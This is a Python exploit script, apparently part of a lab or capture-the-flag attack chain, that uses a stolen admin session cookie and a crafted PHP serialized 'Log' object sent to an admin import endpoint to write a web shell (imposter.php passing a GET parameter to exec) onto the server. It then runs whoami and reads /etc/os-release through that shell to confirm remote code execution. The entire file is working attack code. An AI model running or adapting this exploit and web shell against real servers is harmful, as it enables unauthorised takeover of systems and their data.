import requests

class RemoteCodeExecution:
    def __init__(self, session, base_url, admin_cookie):
        self.session = session
        self.base_url = base_url
        self.admin_cookie = admin_cookie

    def run(self):
        print("Remote Code Execution Started")

        self.session.cookies.set('PHPSESSID', self.admin_cookie)

        target_path = "imposter.php"
        imposter_content = "<?php exec($_GET['cmd'], $output); echo implode('\\n', $output); ?>"
        
        f_len = len(target_path)
        m_len = len(imposter_content)
        payload_string = f'O:3:"Log":2:{{s:1:"f";s:{f_len}:"{target_path}";s:1:"m";s:{m_len}:"{imposter_content}";}}'

        # Post the payload to the vulnerable endpoint
        import_url = f"{self.base_url}/admin/import_user.php"
        data = {'userobj': payload_string}
        
        print("[*] Sending dynamically calculated object payload...")
        self.session.post(import_url, data=data)

        # Verification 1: Passing 'whoami' to our new execution imposter
        imposter_url = f"{self.base_url}/imposter.php?cmd=whoami"
        print(f"[*] Verifying code execution via command check at {imposter_url}...")
        
        try:
            response = self.session.get(imposter_url)
            if response.status_code == 200 and response.text.strip() != "":
                print("[+] SUCCESS: REMOTE CODE EXECUTION CONFIRMED!")
                print(f"[+] Server OS Identity (whoami): {response.text.strip()}")
        except Exception as e:
            print(f"[-] Verification connection failed: {e}")
            print("[-] Exploit proof could not be verified.")
            return False

        # Verification 2: Querying the OS distribution details
        imposter_url = f"{self.base_url}/imposter.php?cmd=cat /etc/os-release"
        print(f"[*] Verifying code execution via system release query at {imposter_url}...")
        
        try:
            response = self.session.get(imposter_url)
            if response.status_code == 200 and response.text.strip() != "":
                print(f"[+] Server OS Environment Data:\n\n{response.text.strip()}")
                return True
        except Exception as e:
            print(f"[-] Verification connection failed: {e}")
            print("[-] Exploit proof could not be verified.")
        return False